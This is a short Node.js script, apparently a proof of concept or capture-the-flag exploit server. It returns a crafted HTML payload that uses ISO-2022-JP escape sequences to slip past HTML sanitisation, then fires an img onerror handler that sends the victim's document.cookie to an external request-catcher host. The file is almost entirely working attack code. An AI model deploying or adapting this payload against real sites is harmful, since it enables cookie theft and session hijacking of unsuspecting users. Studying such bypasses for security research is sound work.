const createDOMPurify = require("dompurify");
const { JSDOM } = require("jsdom");
const http = require("http");

const server = http.createServer((req, res) => {
    res.statusCode = 200;
    res.setHeader("Content-Type", "text/plain");
    res.end(`<a id="\x1b$B"></a>\x1b(B<a src="><img src=x onerror=fetch('http://catchme.requestcatcher.com/catch?c='+document.cookie,{mode:'no-cors'})>"></a>`);
});

const PORT = process.env.PORT || 1338;
server.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});